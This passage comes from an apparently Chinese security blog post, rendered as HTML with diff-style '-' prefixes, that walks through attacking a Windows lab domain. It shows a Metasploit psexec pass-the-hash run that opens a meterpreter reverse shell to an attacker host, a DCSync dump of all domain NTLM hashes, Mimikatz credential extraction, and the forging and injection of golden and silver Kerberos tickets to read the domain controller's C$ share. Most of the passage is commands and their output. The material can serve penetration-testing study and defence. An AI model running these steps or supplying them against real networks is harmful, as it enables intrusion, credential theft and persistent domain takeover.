-</span></span><span style="display:flex;"><span>RHOSTS                10.11.11.5                         yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/usi
-</span></span><span style="display:flex;"><span>                                                                    ng-metasploit/basics/using-metasploit.html
-</span></span><span style="display:flex;"><span>RPORT                 <span style="color:#ae81ff">445</span>                                yes       The SMB service port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>SERVICE_DESCRIPTION                                      no        Service description to be used on target <span style="color:#66d9ef">for</span> pretty listing
-</span></span><span style="display:flex;"><span>SERVICE_DISPLAY_NAME                                     no        The service display name
-</span></span><span style="display:flex;"><span>SERVICE_NAME                                             no        The service name
-</span></span><span style="display:flex;"><span>SMBDomain             test.com                           no        The Windows domain to use <span style="color:#66d9ef">for</span> authentication
-</span></span><span style="display:flex;"><span>SMBPass               00000000000000000000000000000000:  no        The password <span style="color:#66d9ef">for</span> the specified username
-</span></span><span style="display:flex;"><span>                      209c6174da490caeb422f3fa5a7ae634
-</span></span><span style="display:flex;"><span>SMBSHARE                                                 no        The share to connect to, can be an admin share <span style="color:#f92672">(</span>ADMIN$,C$,..
-</span></span><span style="display:flex;"><span>                                                                    .<span style="color:#f92672">)</span> or a normal read/write folder share
-</span></span><span style="display:flex;"><span>SMBUser               admin                              no        The username to authenticate as
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Name      Current Setting  Required  Description
-</span></span><span style="display:flex;"><span>----      ---------------  --------  -----------
-</span></span><span style="display:flex;"><span>EXITFUNC  thread           yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>LHOST     172.20.10.2      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Exploit target:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Id  Name
-</span></span><span style="display:flex;"><span>--  ----
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>   Automatic
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; run
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 172.20.10.2:4444
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.11.11.5:445 - Connecting to the server...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.11.11.5:445 - Authenticating to 10.11.11.5:445|test.com as user <span style="color:#e6db74">&#39;admin&#39;</span>...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.11.11.5:445 - Selecting native target
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.11.11.5:445 - Uploading payload... qusizJPL.exe
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.11.11.5:445 - Created <span style="color:#ae81ff">\q</span>usizJPL.exe...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.11.11.5:445 - Service started successfully...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 172.20.10.2
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.11.11.5:445 - Deleting <span style="color:#ae81ff">\q</span>usizJPL.exe...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">7</span> opened <span style="color:#f92672">(</span>172.20.10.2:4444 -&gt; 172.20.10.5:65265<span style="color:#f92672">)</span> at 2023-03-06 14:28:01 +0800
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>meterpreter &gt; ifconfig
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Interface 65539
-</span></span><span style="display:flex;"><span><span style="color:#f92672">============</span>
-</span></span><span style="display:flex;"><span>Name         : Parallels Ethernet Adapter
-</span></span><span style="display:flex;"><span>Hardware MAC : 00:1c:42:5e:07:99
-</span></span><span style="display:flex;"><span>MTU          : <span style="color:#ae81ff">1500</span>
-</span></span><span style="display:flex;"><span>IPv4 Address : 10.11.11.5
-</span></span><span style="display:flex;"><span>IPv4 Netmask : 255.255.255.0
-</span></span></code></pre></div></li>
-</ul>
-<h3 id="0x04-黄金票据">0x04 黄金票据</h3>
-<p>黄金票据是伪造 TGS，一般拿下域控后用来维权，因为 krbtgt 域账户的密码基本不会更改</p>
-<ul>
-<li>
-<p>利用条件</p>
-<ul>
-<li>域名称</li>
-<li>域 SID</li>
-<li>krbtgt NTLM-Hash(需要拿下域控)</li>
-</ul>
-</li>
-<li>
-<p>域内普通用户 shell 获取 DC 名称</p>
-<ul>
-<li>
-<p>改编码</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;chcp <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>chcp <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>Active code page: <span style="color:#ae81ff">65001</span>
-</span></span></code></pre></div></li>
-<li>
-<p>net config workstation | findstr domain 得到域名称</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;net config workstation | findstr domain
-</span></span><span style="display:flex;"><span>net config workstation | findstr domain
-</span></span><span style="display:flex;"><span>Workstation domain                   TEST
-</span></span><span style="display:flex;"><span>Logon domain                         TEST
-</span></span></code></pre></div></li>
-<li>
-<p>nltest /dsgetdc:TEST 得到 dc 主机名为 <code>\\WIN-2008</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;nltest /dsgetdc:TEST
-</span></span><span style="display:flex;"><span>nltest /dsgetdc:TEST
-</span></span><span style="display:flex;"><span>           DC: <span style="color:#ae81ff">\\</span>WIN-2008
-</span></span><span style="display:flex;"><span>      Address: <span style="color:#ae81ff">\\</span>10.11.11.5
-</span></span><span style="display:flex;"><span>     Dom Guid: 319da0ce-39fd-4861-8e18-6a2264cfe874
-</span></span><span style="display:flex;"><span>     Dom Name: TEST
-</span></span><span style="display:flex;"><span>  Forest Name: test.com
-</span></span><span style="display:flex;"><span> Dc Site Name: Default-First-Site-Name
-</span></span><span style="display:flex;"><span>Our Site Name: Default-First-Site-Name
-</span></span><span style="display:flex;"><span>        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS
-</span></span><span style="display:flex;"><span>The command completed successfully
-</span></span></code></pre></div></li>
-</ul>
-</li>
-<li>
-<p>域内普通用户获取域 SID</p>
-<ul>
-<li>
-<p>kiwi_cmd token::whoami</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; kiwi_cmd token::whoami
-</span></span><span style="display:flex;"><span> * Process Token : <span style="color:#f92672">{</span>0;0001a410<span style="color:#f92672">}</span> <span style="color:#ae81ff">1</span> D <span style="color:#ae81ff">111721</span>    	TEST<span style="color:#ae81ff">\z</span>hangsan	S-1-5-21-3160176211-3702513722-812664031-1118	<span style="color:#f92672">(</span>10g,05p<span style="color:#f92672">)</span>	Primary
-</span></span><span style="display:flex;"><span> * Thread Token  : no token
-</span></span></code></pre></div></li>
-<li>
-<p>whoami /user</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami /user
-</span></span><span style="display:flex;"><span>whoami /user
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>USER INFORMATION
-</span></span><span style="display:flex;"><span>----------------
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>User Name     SID
-</span></span><span style="display:flex;"><span><span style="color:#f92672">=============</span> <span style="color:#f92672">=============================================</span>
-</span></span><span style="display:flex;"><span>test<span style="color:#ae81ff">\z</span>hangsan S-1-5-21-3160176211-3702513722-812664031-1118
-</span></span></code></pre></div></li>
-<li>
-<p>wmic useraccount get name,sid</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;wmic useraccount get name,sid
-</span></span><span style="display:flex;"><span>wmic useraccount get name,sid
-</span></span><span style="display:flex;"><span>Name           SID
-</span></span><span style="display:flex;"><span>Administrator  S-1-5-21-2772043085-310273303-638560154-500
-</span></span><span style="display:flex;"><span>Guest          S-1-5-21-2772043085-310273303-638560154-501
-</span></span><span style="display:flex;"><span>reber          S-1-5-21-2772043085-310273303-638560154-1000
-</span></span><span style="display:flex;"><span>Administrator  S-1-5-21-3160176211-3702513722-812664031-500
-</span></span><span style="display:flex;"><span>Guest          S-1-5-21-3160176211-3702513722-812664031-501
-</span></span><span style="display:flex;"><span>krbtgt         S-1-5-21-3160176211-3702513722-812664031-502
-</span></span><span style="display:flex;"><span>zhangsan       S-1-5-21-3160176211-3702513722-812664031-1118
-</span></span><span style="display:flex;"><span>lisi           S-1-5-21-3160176211-3702513722-812664031-1126
-</span></span><span style="display:flex;"><span>admin          S-1-5-21-3160176211-3702513722-812664031-1128
-</span></span></code></pre></div></li>
-</ul>
-</li>
-<li>
-<p>域内管理员组用户权限获取 krbtgt NTLM-Hash</p>
-<p>kiwi 模块同时支持 32 位和 64 位操作系统，默认加载是 32 位操作系统<br>
-如果当前 session 为 x86，dc 为 x64，则要先注入到 x64</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; load kiwi
-</span></span><span style="display:flex;"><span>Success.
-</span></span><span style="display:flex;"><span>meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:test.com /all /csv
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">502</span>        krbtgt  3f92886413f9d4ab78e03c6275a71b85  <span style="color:#ae81ff">514</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1127</span>     WIN2003$  5ad1bf868f8ddbe900c15dfe82e6c08e  <span style="color:#ae81ff">4096</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1008</span>    WIN-2008$  f048fbe3fc1722d6a83388364dab9cdc  <span style="color:#ae81ff">532480</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">500</span> Administrator  0e032b9d51a580ac6cdfabad8bc97a38  <span style="color:#ae81ff">512</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1118</span>     zhangsan  993ca38cf7795d31bc429a8b9903a01a  <span style="color:#ae81ff">66048</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1126</span>         lisi  6447286bfde2f1ac790331e33b819657  <span style="color:#ae81ff">66048</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1123</span>    WIN7PRO2$  c4f03bb85e00c17788e8d9ee5c60aef0  <span style="color:#ae81ff">4096</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1122</span>     WIN7PRO$  2d688c9797ca9f14639c541f289479ed  <span style="color:#ae81ff">4096</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1128</span>        admin  209c6174da490caeb422f3fa5a7ae634  <span style="color:#ae81ff">66048</span>
-</span></span></code></pre></div></li>
-<li>
-<p>域内管理员组用户权限生成票据</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; golden_ticket_create -d test.com -s S-1-5-21-3160176211-3702513722-812664031 -k 3f92886413f9d4ab78e03c6275a71b85 -u abc -t /tmp/abc.kirbi
-</span></span></code></pre></div></li>
-<li>
-<p>域内普通用户导入票据</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; getuid
-</span></span><span style="display:flex;"><span>Server username: TEST<span style="color:#ae81ff">\z</span>hangsan
-</span></span><span style="display:flex;"><span>meterpreter &gt; kerberos_ticket_purge
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Kerberos tickets purged
-</span></span><span style="display:flex;"><span>meterpreter &gt; kerberos_ticket_use /tmp/abc.kirbi
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using Kerberos ticket stored in /tmp/abc.kirbi, <span style="color:#ae81ff">1820</span> bytes ...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Kerberos ticket applied successfully.
-</span></span><span style="display:flex;"><span>meterpreter &gt; kerberos_ticket_list
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Kerberos tickets found in the current session.
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00000000<span style="color:#f92672">]</span> - 0x00000017 - rc4_hmac_nt
-</span></span><span style="display:flex;"><span>   Start/End/MaxRenew: 2023/3/24 4:11:16 ; 2033/3/21 12:11:16 ; 2033/3/21 12:11:16
-</span></span><span style="display:flex;"><span>   Server Name       : krbtgt/test.com @ test.com
-</span></span><span style="display:flex;"><span>   Client Name       : abc @ test.com
-</span></span><span style="display:flex;"><span>   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>meterpreter &gt; shell
-</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">3796</span> created.
-</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">2</span> created.
-</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>�汾 6.1.7600<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>��Ȩ���� <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation����������Ȩ��
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;chcp <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>chcp <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>Active code page: <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;dir <span style="color:#ae81ff">\\</span>WIN-2008<span style="color:#ae81ff">\C</span>$
-</span></span><span style="display:flex;"><span>dir <span style="color:#ae81ff">\\</span>WIN-2008<span style="color:#ae81ff">\C</span>$
-</span></span><span style="display:flex;"><span> Volume in drive <span style="color:#ae81ff">\\</span>WIN-2008<span style="color:#ae81ff">\C</span>$ has no label.
-</span></span><span style="display:flex;"><span> Volume Serial Number is B08C-EB53
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> Directory of <span style="color:#ae81ff">\\</span>WIN-2008<span style="color:#ae81ff">\C</span>$
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>2009/07/13  20:20    &lt;DIR&gt;          PerfLogs
-</span></span><span style="display:flex;"><span>2018/07/26  21:51    &lt;DIR&gt;          Program Files
-</span></span><span style="display:flex;"><span>2023/03/02  20:45    &lt;DIR&gt;          Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>2017/09/12  20:49    &lt;DIR&gt;          Users
-</span></span><span style="display:flex;"><span>2023/03/06  00:44    &lt;DIR&gt;          Windows
-</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>              <span style="color:#ae81ff">0</span> bytes
-</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">5</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>  124,080,254,976 bytes free
-</span></span></code></pre></div></li>
-</ul>
-<h3 id="0x05-白银票据">0x05 白银票据</h3>
-<p>白银票据是伪造 TGS，不会经过 KDC，更加隐蔽，但权限就远不如黄金票据</p>
-<ul>
-<li>
-<p>可利用服务</p>
-<table>
-<thead>
-<tr>
-<th>服务</th>
-<th>服务名</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>WMI</td>
-<td>HOST、RPCSS</td>
-</tr>
-<tr>
-<td>PowerShell Remoting</td>
-<td>HOST、HTTP</td>
-</tr>
-<tr>
-<td>WinRM</td>
-<td>HOST、HTTP</td>
-</tr>
-<tr>
-<td>Scheduled Tasks</td>
-<td>HOST</td>
-</tr>
-<tr>
-<td>Windows File Share (CIFS)</td>
-<td>CIFS</td>
-</tr>
-<tr>
-<td>LDAP、DCSync</td>
-<td>LDAP</td>
-</tr>
-<tr>
-<td>Windows Remote Server</td>
-<td>RPCSS、LDAP、CIFS</td>
-</tr>
-</tbody>
-</table>
-</li>
-<li>
-<p>利用条件</p>
-<ul>
-<li>域名称</li>
-<li>域 SID</li>
-<li>服务账号的 NTLM-Hash</li>
-<li>目标服务器 FQDN</li>
-<li>可利用的服务</li>
-</ul>
-</li>
-<li>
-<p>域内用户 SYSTEM 权限获取域名称、SID、NTLM-Hash</p>
-<p>Domain       : TEST<br>
-User Server  : DC$<br>
-SID          : S-1-5-21-3160176211-3702513722-812664031<br>
-NTLM         : 993ca38cf7795d31bc429a8b9903a01a</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; getuid
-</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
-</span></span><span style="display:flex;"><span>meterpreter &gt; load kiwi
-</span></span><span style="display:flex;"><span>Success.
-</span></span><span style="display:flex;"><span>meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Authentication Id : <span style="color:#ae81ff">0</span> ; <span style="color:#ae81ff">996</span> <span style="color:#f92672">(</span>00000000:000003e4<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Session           : Service from <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>User Name         : DC$
-</span></span><span style="display:flex;"><span>Domain            : TEST
-</span></span><span style="display:flex;"><span>Logon Server      : <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Logon Time        : 2023/3/25 10:42:15
-</span></span><span style="display:flex;"><span>SID               : S-1-5-20
-</span></span><span style="display:flex;"><span>	msv :
-</span></span><span style="display:flex;"><span>	 <span style="color:#f92672">[</span>00000003<span style="color:#f92672">]</span> Primary
-</span></span><span style="display:flex;"><span>	 * Username : DC$
-</span></span><span style="display:flex;"><span>	 * Domain   : TEST
-</span></span><span style="display:flex;"><span>	 * NTLM     : 993ca38cf7795d31bc429a8b9903a01a
-</span></span><span style="display:flex;"><span>	 * SHA1     : 104c7eec951d84ce412bd21e123b67520688f570
-</span></span><span style="display:flex;"><span>meterpreter &gt; shell
-</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">2732</span> created.
-</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">3</span> created.
-</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>�汾 6.1.7600<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>��Ȩ���� <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation����������Ȩ��
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;wmic useraccount get name,sid
-</span></span><span style="display:flex;"><span>wmic useraccount get name,sid
-</span></span><span style="display:flex;"><span>Name           SID
-</span></span><span style="display:flex;"><span>Administrator  S-1-5-21-3160176211-3702513722-812664031-500
-</span></span><span style="display:flex;"><span>Guest          S-1-5-21-3160176211-3702513722-812664031-501
-</span></span><span style="display:flex;"><span>krbtgt         S-1-5-21-3160176211-3702513722-812664031-502
-</span></span><span style="display:flex;"><span>zhangsan       S-1-5-21-3160176211-3702513722-812664031-1118
-</span></span><span style="display:flex;"><span>lisi           S-1-5-21-3160176211-3702513722-812664031-1126
-</span></span><span style="display:flex;"><span>admin          S-1-5-21-3160176211-3702513722-812664031-1128
-</span></span></code></pre></div></li>
-<li>
-<p>域内普通用户权限直接导入票据</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; getuid
-</span></span><span style="display:flex;"><span>Server username: TEST<span style="color:#ae81ff">\z</span>hangsan
-</span></span><span style="display:flex;"><span>meterpreter &gt; kerberos_ticket_purge
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Kerberos tickets purged
-</span></span><span style="display:flex;"><span>meterpreter &gt; kiwi_cmd kerberos::golden /domain:test.com /sid:S-1-5-21-3160176211-3702513722-812664031 /target:dc.test.com /service:cifs /rc4:993ca38cf7795d31bc429a8b9903a01a /user:abc /ptt
-</span></span><span style="display:flex;"><span>User      : abc
-</span></span><span style="display:flex;"><span>Domain    : test.com <span style="color:#f92672">(</span>TEST<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>SID       : S-1-5-21-3160176211-3702513722-812664031
-</span></span><span style="display:flex;"><span>User Id   : <span style="color:#ae81ff">500</span>
-</span></span><span style="display:flex;"><span>Groups Id : *513 <span style="color:#ae81ff">512</span> <span style="color:#ae81ff">520</span> <span style="color:#ae81ff">518</span> <span style="color:#ae81ff">519</span>
-</span></span><span style="display:flex;"><span>ServiceKey: 993ca38cf7795d31bc429a8b9903a01a - rc4_hmac_nt
-</span></span><span style="display:flex;"><span>Service   : cifs
-</span></span><span style="display:flex;"><span>Target    : dc.test.com
-</span></span><span style="display:flex;"><span>Lifetime  : 2023/3/24 22:30:08 ; 2033/3/21 22:30:08 ; 2033/3/21 22:30:08
-</span></span><span style="display:flex;"><span>-&gt; Ticket : ** Pass The Ticket **
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> * PAC generated
-</span></span><span style="display:flex;"><span> * PAC signed
-</span></span><span style="display:flex;"><span> * EncTicketPart generated
-</span></span><span style="display:flex;"><span> * EncTicketPart encrypted
-</span></span><span style="display:flex;"><span> * KrbCred generated
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Golden ticket <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;abc @ test.com&#39;</span> successfully submitted <span style="color:#66d9ef">for</span> current session
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>meterpreter &gt; kerberos_ticket_list
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Kerberos tickets found in the current session.
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00000000<span style="color:#f92672">]</span> - 0x00000017 - rc4_hmac_nt
-</span></span><span style="display:flex;"><span>   Start/End/MaxRenew: 2023/3/24 22:30:08 ; 2033/3/21 22:30:08 ; 2033/3/21 22:30:08
-</span></span><span style="display:flex;"><span>   Server Name       : cifs/dc.test.com @ test.com
-</span></span><span style="display:flex;"><span>   Client Name       : abc @ test.com
-</span></span><span style="display:flex;"><span>   Flags 40a00000    : pre_authent ; renewable ; forwardable ;
-</span></span></code></pre></div><p>导入白银票据后可直接查看域控的 C 盘文件</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; shell
-</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">2004</span> created.
-</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">1</span> created.
-</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>�汾 6.1.7600<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>��Ȩ���� <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation����������Ȩ��
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;chcp <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>chcp <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>Active code page: <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;dir <span style="color:#ae81ff">\\</span>win-2008<span style="color:#ae81ff">\c</span>$
-</span></span><span style="display:flex;"><span>dir <span style="color:#ae81ff">\\</span>win-2008<span style="color:#ae81ff">\c</span>$
-</span></span><span style="display:flex;"><span> Volume in drive <span style="color:#ae81ff">\\</span>win-2008<span style="color:#ae81ff">\c</span>$ has no label.
-</span></span><span style="display:flex;"><span> Volume Serial Number is B08C-EB53
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> Directory of <span style="color:#ae81ff">\\</span>win-2008<span style="color:#ae81ff">\c</span>$
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>2009/07/13  20:20    &lt;DIR&gt;          PerfLogs
-</span></span><span style="display:flex;"><span>2018/07/26  21:51    &lt;DIR&gt;          Program Files
-</span></span><span style="display:flex;"><span>2023/03/02  20:45    &lt;DIR&gt;          Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>2017/09/12  20:49    &lt;DIR&gt;          Users
-</span></span><span style="display:flex;"><span>2023/03/06  00:44    &lt;DIR&gt;          Windows
-</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>              <span style="color:#ae81ff">0</span> bytes
-</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">5</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>  124,094,062,592 bytes free
-</span></span></code></pre></div></li>
-</ul>
-<h4 id="reference侵删">Reference(侵删)：</h4>
-<ul>
-<li><a href="https://www.cnblogs.com/howtime/p/12498608.html?_blank">https://www.cnblogs.com/howtime/p/12498608.html</a></li>
-<li><a href="https://blog.csdn.net/weixin_60109175/article/details/123971841?_blank">https://blog.csdn.net/weixin_60109175/article/details/123971841</a></li>
-<li><a href="https://txluck.github.io/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/?_blank">https://txluck.github.io/2022/03/04/黄金票据和白银票据/</a></li>
